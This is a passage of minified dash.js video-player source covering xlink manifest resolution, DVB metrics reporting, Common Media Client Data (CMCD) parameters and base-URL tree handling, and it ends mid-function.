Q},setConfig:function(B){B&&(B.dashMetrics&&(ma=B.dashMetrics),B.baseURLController&&(H=B.baseURLController))},reset:function(){ja=!1}},R=(0,x.default)(h).getInstance().getLogger(O),O}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(225)),l=u(241),f=v(u(46)),g=v(u(54)),t=v(u(51)),r=v(u(47)),x=v(u(45)),z=v(u(220));m.__dashjs_factory_name="TimeSyncController",(u=r.default.getSingletonFactory(m)).HTTP_TIMEOUT_MS=5e3,r.default.updateSingletonFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{220:220,225:225,241:241,45:45,46:46,47:47,51:51,54:54}],123:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(Q,ja,W){var aa={};for(aa.elements=Q,aa.type=ja,aa.resolveType=W,0===aa.elements.length&&D(aa),W=0;W<aa.elements.length;W++)Q=aa.elements[W],ja=N.isHTTPURL(Q.url)?Q.url:Q.originalContent.BaseURL+Q.url,R.load(ja,Q,aa)}function E(Q){var ja,W="",aa=Q.element;Q=Q.resolveObject,aa.resolvedContent&&((ja=0)===aa.resolvedContent.indexOf("<?xml")&&(ja=aa.resolvedContent.indexOf("?>")+2),W=aa.resolvedContent.substr(0,ja)+"<response>"+aa.resolvedContent.substr(ja)+"</response>",aa.resolvedContent=O.xml_str2json(W));a:{for(ja=0;ja<Q.elements.length;ja++)if(!1===Q.elements[ja].resolved){ja=!1;break a}ja=!0}ja&&D(Q)}function D(Q){var H,B,A,ja=[],W=void 0,aa=[],ma=void 0;for(B=Q.elements.length-1;0<=B;B--){if(H=(ma=Q.elements[B]).type+"_asArray",ma.resolvedContent){if(ma.resolvedContent)for(A=0;A<ma.resolvedContent[H].length;A++){var Y=ma.resolvedContent[H][A];aa.push(Y)}}else delete ma.originalContent["xlink:actuate"],delete ma.originalContent["xlink:href"],aa.push(ma.originalContent);for(ma.parentElement[H].splice(ma.index,1),Y=0;Y<aa.length;Y++)ma.parentElement[H].splice(ma.index+Y,0,aa[Y]);aa=[]}if(0<Q.elements.length&&F.run(P),"onActuate"===Q.resolveType&&G.trigger(f.default.XLINK_READY,{manifest:P}),"onLoad"===Q.resolveType)switch(Q.type){case x.default.PERIOD:for(Q=0;Q<P[x.default.PERIOD+"_asArray"].length;Q++)(W=P[x.default.PERIOD+"_asArray"][Q]).hasOwnProperty(x.default.ADAPTATION_SET+"_asArray")&&(ja=ja.concat(I(W[x.default.ADAPTATION_SET+"_asArray"],W,x.default.ADAPTATION_SET,"onLoad"))),W.hasOwnProperty(x.default.EVENT_STREAM+"_asArray")&&(ja=ja.concat(I(W[x.default.EVENT_STREAM+"_asArray"],W,x.default.EVENT_STREAM,"onLoad")));J(ja,x.default.ADAPTATION_SET,"onLoad");break;case x.default.ADAPTATION_SET:G.trigger(f.default.XLINK_READY,{manifest:P})}}function I(Q,ja,W,aa){var B,ma=[],H=void 0,A=void 0;for(B=Q.length-1;0<=B;B--)(H=Q[B]).hasOwnProperty("xlink:href")&&"urn:mpeg:dash:resolve-to-zero:2013"===H["xlink:href"]&&Q.splice(B,1);for(B=0;B<Q.length;B++)(H=Q[B]).hasOwnProperty("xlink:href")&&H.hasOwnProperty("xlink:actuate")&&H["xlink:actuate"]===aa&&(A={url:H["xlink:href"],parentElement:ja,type:W,index:B,resolveType:aa,originalContent:H,resolvedContent:null,resolved:!1},ma.push(A));return ma}z=z||{};var L=this.context,G=(0,l.default)(L).getInstance(),N=(0,r.default)(L).getInstance(),w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0;return w={resolveManifestOnLoad:function(Q){O=new t.default({escapeMode:!1,attributePrefix:"",arrayAccessForm:"property",emptyNodeForm:"object",stripWhitespaces:!1,enableToStringFunc:!1,ignoreRoot:!0,matchers:h}),J(I((P=Q).Period_asArray,P,x.default.PERIOD,"onLoad"),x.default.PERIOD,"onLoad")},setMatchers:function(Q){Q&&(h=Q)},setIron:function(Q){Q&&(F=Q)},reset:function(){G.off(f.default.XLINK_ELEMENT_LOADED,E,w),R&&(R.reset(),R=null)}},G.on(f.default.XLINK_ELEMENT_LOADED,E,w),R=(0,p.default)(L).create({errHandler:z.errHandler,dashMetrics:z.dashMetrics,mediaPlayerModel:z.mediaPlayerModel,requestModifier:z.requestModifier,settings:z.settings}),w}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(107)),l=v(u(46)),f=v(u(54)),g=v(u(47)),t=v(u(3)),r=v(u(220)),x=v(u(61));m.__dashjs_factory_name="XlinkController",M.default=g.default.getClassFactory(m),da.exports=M.default},{107:107,220:220,3:3,46:46,47:47,54:54,61:61}],124:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){var r=this.context;return{createMetricsReporting:function(x){return(0,p.default)(r).getInstance({eventBus:x.eventBus,dashMetrics:x.dashMetrics,metricsConstants:x.metricsConstants,events:x.events}),(0,f.default)(r).create(x)},getReportingFactory:function(){return(0,t.default)(r).getInstance()},getMetricsHandlerFactory:function(){return(0,g.default)(r).getInstance()}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(138)),l=v(u(125)),f=v(u(126)),g=v(u(131)),t=v(u(136));m.__dashjs_factory_name="MetricsReporting",(u=Na.FactoryMaker.getClassFactory(m)).events=l.default,Na.FactoryMaker.updateClassFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{125:125,126:126,131:131,136:136,138:138}],125:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.METRICS_INITIALISATION_COMPLETE="internal_metricsReportingInitialized",this.BECAME_REPORTING_PLAYER="internal_becameReportingPlayer"}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(55))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{55:55}],126:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(D){var I;D.error||(I=Object.keys(x),(0,l.default)(z).getInstance({adapter:g.adapter,constants:g.constants}).getMetrics(D.manifest).forEach((function(L){var G=JSON.stringify(L);if(x.hasOwnProperty(G))I.splice(G,1);else try{var N=(0,p.default)(z).create(g);N.initialize(L),x[G]=N}catch(w){}})),I.forEach((function(L){x[L].reset(),delete x[L]})),J.trigger(f.default.METRICS_INITIALISATION_COMPLETE))}function r(){Object.keys(x).forEach((function(D){x[D].reset()})),x={}}g=g||{};var x={},z=this.context,J=g.eventBus,E=g.events;return J.on(E.MANIFEST_UPDATED,t),J.on(E.STREAM_TEARDOWN_COMPLETE,r),{reset:function(){J.off(E.MANIFEST_UPDATED,t),J.off(E.STREAM_TEARDOWN_COMPLETE,r)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(127)),l=v(u(140)),f=v(u(125));m.__dashjs_factory_name="MetricsCollectionController",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{125:125,127:127,140:140}],127:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(){r&&r.reset(),x&&x.reset(),z&&z.reset()}g=g||{};var r=void 0,x=void 0,z=void 0,J=this.context;return{initialize:function(E){try{(z=(0,p.default)(J).create({mediaElement:g.mediaElement})).initialize(E.Range),(x=(0,l.default)(J).create({debug:g.debug,metricsConstants:g.metricsConstants})).initialize(E.Reporting,z),(r=(0,f.default)(J).create({debug:g.debug,eventBus:g.eventBus,metricsConstants:g.metricsConstants,events:g.events})).initialize(E.metrics,x)}catch(D){throw t(),D}},reset:t}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(129)),l=v(u(130)),f=v(u(128));m.__dashjs_factory_name="MetricsController",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{128:128,129:129,130:130}],128:[function(u,da,M){function v(l){function f(E){g.forEach((function(D){D.handleNewMetric(E.metric,E.value,E.mediaType)}))}l=l||{};var g=[],t=void 0,r=this.context,x=l.eventBus,z=l.events,J=(0,p.default)(r).getInstance({debug:l.debug,eventBus:l.eventBus,metricsConstants:l.metricsConstants});return t={initialize:function(E,D){E.split(",").forEach((function(I,L,G){var N,w;-1===I.indexOf("(")||-1!==I.indexOf(")")||(w=G[L+1])&&-1===w.indexOf("(")&&-1!==w.indexOf(")")&&(I+=","+w,delete G[L+1]),(N=J.create(I,D))&&g.push(N)})),x.on(z.METRIC_ADDED,f,t),x.on(z.METRIC_UPDATED,f,t)},reset:function(){x.off(z.METRIC_ADDED,f,t),x.off(z.METRIC_UPDATED,f,t),g.forEach((function(E){return E.reset()})),g=[]}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(131))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="MetricsHandlersController",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{131:131}],129:[function(u,da,M){function v(l){l=l||{};var f,g=!1,t=this.context,r=void 0,x=l.mediaElement;return f={initialize:function(z){z&&z.length&&(z.forEach((function(J){var E=J.starttime;r.add(E,E+J.duration)})),g=!!z[0]._useWallClockTime)},reset:function(){r.clear()},isEnabled:function(){var z=r.length;if(!z)return!0;for(var J=g?(new Date).getTime()/1e3:x.currentTime,E=0;E<z;E+=1){var D=r.start(E),I=r.end(E);if(D<=J&&J<I)return!0}return!1}},r=(0,p.default)(t).create(),f}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(208))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="RangeController",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{208:208}],130:[function(u,da,M){function v(l){var f=[],g=(0,p.default)(this.context).getInstance(l);return{initialize:function(t,r){t.some((function(x){if(x=g.create(x,r))return f.push(x),!0}))},reset:function(){f.forEach((function(t){return t.reset()})),f=[]},report:function(t,r){f.forEach((function(x){return x.report(t,r)}))}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(136))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="ReportingController",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{136:136}],131:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){var r=(t=t||{}).debug?t.debug.getLogger(void 0):{},x=/([a-zA-Z]*)(\(([0-9]*)(,\s*([a-zA-Z]*))?\))?/,z=this.context,J={BufferLevel:p.default,DVBErrors:l.default,HttpList:f.default,PlayList:g.default,RepSwitchList:g.default,TcpList:g.default};return{create:function(E,D){var I;if(E=E.match(x)){try{(I=J[E[1]](z).create({eventBus:t.eventBus,metricsConstants:t.metricsConstants})).initialize(E[1],D,E[3],E[5])}catch(L){I=null,r.error("MetricsHandlerFactory: Could not create handler for type "+E[1]+" with args "+E[3]+", "+E[5]+" ("+L.message+")")}return I}},register:function(E,D){J[E]=D},unregister:function(E){delete J[E]}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(132)),l=v(u(133)),f=v(u(135)),g=v(u(134));m.__dashjs_factory_name="MetricsHandlerFactory",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{132:132,133:133,134:134,135:135}],132:[function(u,da,M){function v(l){function f(){var L=function(){try{return Object.keys(D).map((function(G){return D[G]})).reduce((function(G,N){return G.level<N.level?G:N}))}catch(G){}}();L&&z!==L.t&&(z=L.t,g.report(r,L))}l=l||{};var g=void 0,t=void 0,r=void 0,x=void 0,z=void 0,J=this.context,E=(0,p.default)(J).getInstance(),D=[],I=l.metricsConstants;return{initialize:function(L,G,N){G&&(t=E.validateN(N),g=G,r=E.reconstructFullMetricName(L,N),x=setInterval(f,t))},reset:function(){clearInterval(x),t=0,z=g=x=null},handleNewMetric:function(L,G,N){L===I.BUFFER_LEVEL&&(D[N]=G)}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(139))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="BufferLevelHandler",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{139:139}],133:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0});var v,m=(v=u(125))&&v.__esModule?v:{default:v};M.default=Na.FactoryMaker.getClassFactory((function(p){function l(){g.off(m.default.METRICS_INITIALISATION_COMPLETE,l,this),g.trigger(m.default.BECAME_REPORTING_PLAYER)}var f=void 0,g=(p=p||{}).eventBus,t=p.metricsConstants;return{initialize:function(r,x){x&&(f=x,g.on(m.default.METRICS_INITIALISATION_COMPLETE,l,this))},reset:function(){f=null},handleNewMetric:function(r,x){r===t.DVB_ERRORS&&f&&f.report(r,x)}}})),da.exports=M.default},{125:125}],134:[function(u,da,M){function v(){var m=void 0,p=void 0;return{initialize:function(l,f){m=l,p=f},reset:function(){p=null,m=void 0},handleNewMetric:function(l,f){l===m&&p&&p.report(m,f)}}}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="GenericMetricHandler",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{}],135:[function(u,da,M){function v(l){function f(){J.length&&g&&g.report(x,J),J=[]}l=l||{};var g=void 0,t=void 0,r=void 0,x=void 0,z=void 0,J=[],E=(0,p.default)(this.context).getInstance(),D=l.metricsConstants;return{initialize:function(I,L,G,N){L&&(t=E.validateN(G),g=L,N&&N.length&&(r=N),x=E.reconstructFullMetricName(I,G,N),z=setInterval(f,t))},reset:function(){clearInterval(z),J=[],g=r=t=z=null},handleNewMetric:function(I,L){I===D.HTTP_REQUEST&&(r&&r!==L.type||J.push(L))}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(139))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="HttpListHandler",M.default=Na.FactoryMaker.getClassFactory(v),da.exports=M.default},{139:139}],136:[function(u,da,M){function v(l){l=l||{};var f={"urn:dvb:dash:reporting:2014":p.default},g=this.context,t=l.debug?l.debug.getLogger(void 0):{},r=l.metricsConstants;return{create:function(x,z){var J=void 0;try{(J=f[x.schemeIdUri](g).create({metricsConstants:r})).initialize(x,z)}catch(E){J=null,t.error("ReportingFactory: could not create Reporting with schemeIdUri "+x.schemeIdUri+" ("+E.message+")")}return J},register:function(x,z){f[x]=z},unregister:function(x){delete f[x]}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(137))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="ReportingFactory",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{137:137}],137:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){f=f||{};var t=this.context,r=void 0,x=void 0,z=void 0,J=void 0,E=void 0,D=void 0,I=[],L=f.metricsConstants;return r=(0,p.default)(t).getInstance(),x=(0,l.default)(t).getInstance(),J=z=!1,D=E=null,{report:function(G,N){Array.isArray(N)||(N=[N]),J&&D.isEnabled()&&N.forEach((function(w){w=r.serialise(w),G!==L.DVB_ERRORS&&(w="metricname="+G+"&"+w),function g(G,N,w){function h(){var P=I.indexOf(F);-1!==P&&(I.splice(P,1),200<=F.status&&300>F.status?N&&N():w&&w())}var F=new XMLHttpRequest;I.push(F);try{F.open("GET",G),F.onloadend=h,F.onerror=h,F.send()}catch(P){F.onerror()}}(w=E+"?"+w,null,(function(){J=!1}))}))},initialize:function(G,N){var w=void 0;if(D=N,!(E=G["dvb:reportingUrl"]))throw Error("required parameter missing (dvb:reportingUrl)");z||((w=G["dvb:probability"]||G["dvb:priority"]||0)&&(1e3===w||w/1e3>=x.random())&&(J=!0),z=!0)},reset:function(){J=z=!1,D=E=null}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(141)),l=v(u(142));m.__dashjs_factory_name="DVBReporting",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{141:141,142:142}],138:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){function g(h){var F=new p.default;if(I){for(var P in h)h.hasOwnProperty(P)&&(F[P]=h[P]);F.mpdurl||(F.mpdurl=I.originalUrl||I.url),F.terror||(F.terror=new Date),G.addDVBErrors(F)}}function t(h){h.error||(I=h.manifest)}function r(h){g({errorcode:p.default.BASE_URL_CHANGED,servicelocation:h.entry})}function x(){g({errorcode:p.default.BECAME_REPORTER})}function z(h){var F;h.metric===N.HTTP_REQUEST&&(0===(F=h.value).responsecode||400<=F.responsecode||100>F.responsecode||600<=F.responsecode)&&g({errorcode:F.responsecode||p.default.CONNECTION_ERROR,url:F.url,terror:F.tresponse,servicelocation:F._serviceLocation})}function J(h){switch(h.error?h.error.code:0){case MediaError.MEDIA_ERR_NETWORK:h=p.default.CONNECTION_ERROR;break;case MediaError.MEDIA_ERR_DECODE:h=p.default.CORRUPT_MEDIA_OTHER;break;default:return}g({errorcode:h})}function E(){L.on(w.MANIFEST_UPDATED,t,D),L.on(w.SERVICE_LOCATION_BLACKLIST_CHANGED,r,D),L.on(w.METRIC_ADDED,z,D),L.on(w.METRIC_UPDATED,z,D),L.on(w.PLAYBACK_ERROR,J,D),L.on(l.default.BECAME_REPORTING_PLAYER,x,D)}var D=void 0,I=void 0,L=(f=f||{}).eventBus,G=f.dashMetrics,N=f.metricsConstants,w=f.events;return D={initialise:E,reset:function(){L.off(w.MANIFEST_UPDATED,t,D),L.off(w.SERVICE_LOCATION_BLACKLIST_CHANGED,r,D),L.off(w.METRIC_ADDED,z,D),L.off(w.METRIC_UPDATED,z,D),L.off(w.PLAYBACK_ERROR,J,D),L.off(l.default.BECAME_REPORTING_PLAYER,x,D)}},E(),D}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(143)),l=v(u(125));m.__dashjs_factory_name="DVBErrorsTranslator",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{125:125,143:143}],139:[function(u,da,M){function v(){return{reconstructFullMetricName:function(m,p,l){return p&&(m+="("+p,l&&l.length&&(m+=","+l),m+=")"),m},validateN:function(m){if(!m)throw Error("missing n");if(isNaN(m))throw Error("n is NaN");if(0>m)throw Error("n must be positive");return m}}}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="HandlerHelpers",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{}],140:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){var t=(g=g||{}).adapter,r=g.constants;return{getMetrics:function(x){var z=[];return x&&x.Metrics_asArray&&x.Metrics_asArray.forEach((function(J){var E=new p.default,D=t.getIsDynamic(x);J.hasOwnProperty("metrics")&&(E.metrics=J.metrics,J.Range_asArray&&J.Range_asArray.forEach((function(I){var L,G,N,w=new l.default;w.starttime=(N=0,D?N=t.getAvailabilityStartTime(x)/1e3:(L=t.getRegularPeriods(x)).length&&(N=L[0].start),G=N,I&&I.hasOwnProperty(r.START_TIME)&&(G+=I.starttime),G),I.hasOwnProperty("duration")?w.duration=I.duration:w.duration=t.getDuration(x),w._useWallClockTime=D,E.Range.push(w)})),J.Reporting_asArray&&(J.Reporting_asArray.forEach((function(I){var L=new f.default;if(I.hasOwnProperty(r.SCHEME_ID_URI)){for(var G in L.schemeIdUri=I.schemeIdUri,I)I.hasOwnProperty(G)&&(L[G]=I[G]);E.Reporting.push(L)}})),z.push(E)))})),z}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(144)),l=v(u(145)),f=v(u(146));m.__dashjs_factory_name="ManifestParsing",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{144:144,145:145,146:146}],141:[function(u,da,M){function v(){return{serialise:function l(p){var f=[],g=[],t=void 0,r=void 0;for(t in p)if(p.hasOwnProperty(t)&&0!==t.indexOf("_")){if(null==(r=p[t])&&(r=""),Array.isArray(r)){if(!r.length)continue;g=[],r.forEach((function(x){var z="Object"!==Object.prototype.toString.call(x).slice(8,-1);g.push(z?x:l(x))})),r=g.map(encodeURIComponent).join(",")}else"string"==typeof r?r=encodeURIComponent(r):r instanceof Date?r=r.toISOString():"number"==typeof r&&(r=Math.round(r));f.push(t+"="+r)}return f.join("&")}}}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="MetricSerialiser",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{}],142:[function(u,da,M){function v(){function m(){l&&(t=t||new f(10),l.getRandomValues(t),r=0)}var p,l=wa.crypto||wa.msCrypto,f=Uint32Array,g=Math.pow(2,8*f.BYTES_PER_ELEMENT)-1,t=void 0,r=void 0;return p={random:function(x,z){var J=void 0;return x=x||0,z=z||1,l?(r===t.length&&m(),J=t[r]/g,r+=1):J=Math.random(),J*(z-x)+x}},m(),p}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="RNG",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{}],143:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");this.servicelocation=this.ipaddress=this.url=this.terror=this.errorcode=this.mpdurl=null}Object.defineProperty(M,"__esModule",{value:!0}),v.SSL_CONNECTION_FAILED_PREFIX="SSL",v.DNS_RESOLUTION_FAILED="C00",v.HOST_UNREACHABLE="C01",v.CONNECTION_REFUSED="C02",v.CONNECTION_ERROR="C03",v.CORRUPT_MEDIA_ISOBMFF="M00",v.CORRUPT_MEDIA_OTHER="M01",v.BASE_URL_CHANGED="F00",v.BECAME_REPORTER="S00",M.default=v,da.exports=M.default},{}],144:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.metrics="",this.Range=[],this.Reporting=[]},da.exports=M.default},{}],145:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.starttime=0,this.duration=1/0,this._useWallClockTime=!1},da.exports=M.default},{}],146:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.value=this.schemeIdUri=""},da.exports=M.default},{}],147:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f,g){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.data={baseUrls:f||null,selectedIdx:g||NaN},this.children=[]}function p(){function f(D,I,L){L=z.getBaseURLsFromElement(L),D[I]?E.areEqual(L,D[I].data.baseUrls)||(D[I].data.baseUrls=L,D[I].data.selectedIdx=NaN):D[I]=new m(L)}function t(){x=new m}var r,x=void 0,z=void 0,J=this.context,E=(0,l.default)(J).getInstance();return r={reset:t,update:function(D){!function g(D){if(!z||!z.hasOwnProperty("getBaseURLsFromElement")||!z.hasOwnProperty("getRepresentationSortFunction"))throw Error("setConfig function has to be called previously");var I=z.getBaseURLsFromElement(D);E.areEqual(I,x.data.baseUrls)||(x.data.baseUrls=I,x.data.selectedIdx=NaN),D&&D.Period_asArray&&D.Period_asArray.forEach((function(L,G){f(x.children,G,L),L.AdaptationSet_asArray&&L.AdaptationSet_asArray.forEach((function(N,w){f(x.children[G].children,w,N),N.Representation_asArray&&N.Representation_asArray.sort(z.getRepresentationSortFunction()).forEach((function(h,F){f(x.children[G].children[w].children,F,h)}))}))}))}(D)},getForPath:function(D){var I=x,L=[I.data];return D&&D.forEach((function(G){(I=I.children[G])&&L.push(I.data)})),L.filter((function(G){return G.baseUrls.length}))},invalidateSelectedIndexes:function(D){!function N(L,G){L((G=G||x).data),G.children&&G.children.forEach((function(w){return N(L,w)}))}((function(L){isNaN(L.selectedIdx)||D===L.baseUrls[L.selectedIdx].serviceLocation&&(L.selectedIdx=NaN)}))},setConfig:function(D){D.adapter&&(z=D.adapter)}},t(),r}Object.defineProperty(M,"__esModule",{value:!0});var l=v(u(216));u=v(u(47)),p.__dashjs_factory_name="BaseURLTreeModel",M.default=u.default.getClassFactory(p),da.exports=M.default},{216:216,47:47}],148:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(){function E(){h={pr:1,nor:null,st:null,sf:null,sid:""+z.default.generateUuid(),bs:{audio:1,video:1},cid:null,did:J}}function D(){var W={v:1};return W.sid=ja.get().streaming.cmcd.sid?ja.get().streaming.cmcd.sid:h.sid,W.cid=ja.get().streaming.cmcd.cid?ja.get().streaming.cmcd.cid:h.cid,W.did=ja.get().streaming.cmcd.did?ja.get().streaming.cmcd.did:h.did,W.sid='"'+W.sid+'"',W.cid='"'+W.cid+'"',W.did='"'+W.did+'"',isNaN(h.pr)||1===h.pr||null===h.pr||(W.pr=h.pr),h.st&&(W.st=h.st),h.sf&&(W.sf=h.sf),W}function I(W){try{h.pr=W.playbackRate}catch(aa){}}function L(W){try{var aa=N.getIsDynamic(W.data)?"l":"v",ma=W.protocol&&"MSS"===W.protocol?"s":"d";h.st=aa,h.sf=ma}catch(H){}}function G(W){try{if(W.state&&W.mediaType){var aa=null;switch(W.state){case l.default.BUFFER_LOADED:aa=null;break;case l.default.BUFFER_EMPTY:O.isSeeking()&&(aa=2),aa=4}h.bs[W.mediaType]=aa}}catch(ma){}}var N=void 0,w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=this.context,Q=(0,p.default)(R).getInstance(),ja=(0,t.default)(R).getInstance();return w={getQueryParameter:function(W){try{return ja.get().streaming.cmcd&&ja.get().streaming.cmcd.enabled?{key:"Common-Media-Client-Data",value:function(aa){try{var ma=function(){if(!aa)return{v:null};var H=Object.keys(aa),B=H.length;return{v:H.reduce((function(A,Y,Z){return A+=Y+"="+aa[Y],Z<B-1&&(A+=","),A}),"")}}();if("object"==typeof ma)return ma.v}catch(H){return null}}(function(aa){try{if(aa.type===r.HTTPRequest.MPD_TYPE){try{h.cid=""+z.default.generateHashCode(aa.url)}catch(H){}var ma=((H=D()).ot="m",H)}else ma=aa.type===r.HTTPRequest.MEDIA_SEGMENT_TYPE?function(H){var B=D();try{var A=parseInt(H.mediaInfo.bitrateList[H.quality].bandwidth/1e3)}catch(pa){A=null}var Y=function(pa){try{return isNaN(pa.duration)?null:Math.round(1e3*pa.duration)}catch(ia){return null}}(H),Z="video"===H.mediaType?"v":"audio"===H.mediaType?"a":"fragmentedText"===H.mediaType?"c":null,na=function(pa){try{return Math.round(F.getThroughputHistory().getSafeAverageThroughput(pa))}catch(ia){return null}}(H.mediaType),T=function(pa){try{var ia=h.pr,S=P.getCurrentBufferLevel(pa);return isNaN(ia)||isNaN(S)?null:parseInt(S/ia*1e3)}catch(V){return null}}(H.mediaType);return H=function(pa){try{var ia=pa.mediaType;return null!==h.bs[ia]?h.bs[ia]:P.getCurrentBufferLevel(ia)<pa.duration?3:null}catch(S){}}(H),A&&(B.br=A),Z&&(B.ot=Z),isNaN(Y)||(B.d=Y),isNaN(na)||(B.mtp=na),isNaN(T)||(B.dl=T),isNaN(H)||null===H||(B.bs=H),B}(aa):aa.type===r.HTTPRequest.INIT_SEGMENT_TYPE?function(){var H=D();return H.ot="i",H}():null;return ma}catch(H){return null}var H}(W))}:null}catch(aa){return null}},setConfig:function(W){W&&(W.abrController&&(F=W.abrController),W.dashMetrics&&(P=W.dashMetrics),W.playbackController&&(O=W.playbackController))},reset:function(){Q.off(l.default.PLAYBACK_RATE_CHANGED,I,this),Q.off(l.default.MANIFEST_LOADED,L,this),Q.off(l.default.BUFFER_LEVEL_STATE_CHANGED,G,w),E()},initialize:function(){Q.on(l.default.PLAYBACK_RATE_CHANGED,I,w),Q.on(l.default.MANIFEST_LOADED,L,w),Q.on(l.default.BUFFER_LEVEL_STATE_CHANGED,G,w)}},(0,g.default)(R).getInstance().getLogger(w),N=(0,x.default)(R).getInstance(),E(),w}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(101)),f=v(u(47)),g=v(u(45)),t=v(u(48)),r=u(241),x=v(u(65)),z=v(u(49)),J="dash.js-v"+(0,(u=u(50)).getVersionString)();m.__dashjs_factory_name="CmcdModel",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{101:101,241:241,45:45,46:46,47:47,48:48,49:49,50:50,65:65}],149:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){function g(R){var Q;return!!R&&(Q=!1,P.some((function(ja){if(B=R,A=ja,!isNaN(B.index)&&B.startTime===A.startTime&&B.adaptationIndex===A.adaptationIndex&&B.type===A.type||(ma=R,H=ja,isNaN(ma.index)&&isNaN(H.index)&&ma.quality===H.quality)||(aa=ja,(W=R).action===l.default.ACTION_COMPLETE&&W.action===aa.action))return Q=!0;var W,aa,ma,H,B,A})),Q)}function t(R){return isNaN(R.duration)?.25:Math.min(R.duration/8,.5)}function r(R){P=P.filter((function(Q){var ja=t(Q);return isNaN(Q.startTime)||void 0!==R&&Q.startTime>=R-ja}))}function x(R,Q){Q<=R+.5||(P=P.filter((function(ja){var W=t(ja);return isNaN(ja.startTime)||ja.startTime>=Q-W||isNaN(ja.duration)||ja.startTime+ja.duration<=R+W})))}function z(R,Q){G.addSchedulingInfo(R,Q),G.addRequestsQueue(R.mediaType,O,P)}function J(R){R.sender===N&&(O.splice(O.indexOf(R.request),1),R.response&&!R.error&&P.push(R.request),z(R.request,R.error?"failed":"executed"),I.trigger(L.FRAGMENT_LOADING_COMPLETED,{request:R.request,response:R.response,error:R.error,sender:this}))}function 